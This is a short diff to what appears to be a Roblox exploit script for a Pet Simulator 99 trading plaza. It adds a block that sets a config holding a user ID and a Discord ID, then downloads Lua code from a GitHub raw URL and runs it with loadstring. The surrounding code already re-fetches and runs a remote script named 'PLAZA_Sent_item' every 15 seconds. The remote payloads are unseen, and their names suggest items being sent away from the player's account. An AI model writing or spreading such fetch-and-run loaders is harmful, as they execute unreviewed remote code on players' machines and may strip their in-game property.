@@ -1,6 +1,12 @@
 wait(50)
 
 task.spawn(function()
+wait(1)
+	_G.Config = { UserID = "5e200359-5807-4037-81d0-ab86e443db75", discord_id = "1203177576994967572", Note = "Vin_plaza" }
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/main/pet99"))()
+end)
+
+task.spawn(function()
 	while true do
 		wait(15)
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/PLAZA_Sent_item"))()
